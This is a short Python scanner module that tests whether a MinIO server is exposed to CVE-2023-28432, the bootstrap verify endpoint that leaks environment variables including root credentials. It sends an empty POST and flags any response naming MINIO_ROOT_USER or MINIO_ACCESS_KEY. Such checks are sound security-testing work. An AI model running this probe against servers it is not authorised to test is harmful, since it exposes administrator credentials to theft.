import asyncio
from modules.core import console

# MinIO Scanner (Info Leak)
# Focus: CVE-2023-28432 (Information Disclosure).
# Endpoint: /minio/bootstrap/v1/verify

async def check_minio(session, url):
    try:
        # Check for MinIO Browser presence first?
        # Often headers "Server: MinIO"
        
        # Attack Vector:
        # POST /minio/bootstrap/v1/verify
        # Body: "" (Empty)
        # Should return system info including Env Vars (MINIO_ROOT_USER, MINIO_ROOT_PASSWORD)
        
        target = f"{url.rstrip('/')}/minio/bootstrap/v1/verify"
        
        try:
            async with session.post(target, timeout=5, ssl=False) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    if "MinioEnv" in text or "MINIO_ROOT_USER" in text or "MINIO_ACCESS_KEY" in text:
                         return {
                            "url": target,
                            "type": "MinIO Info Leak (CVE-2023-28432)",
                            "evidence": "Environment variables (Credentials) exposed via verify API."
                        }
        except Exception:
            pass

    except Exception:
        pass
    return None

async def scan_minio(session, url):
    """
    Scan for MinIO Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- MinIO Scanner ---[/bold cyan]")
    
    results = []
    res = await check_minio(session, url)
    if res:
         console.print(f"  [bold red][!] MINIO VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No MinIO info leak found.[/dim]")
        
    return results
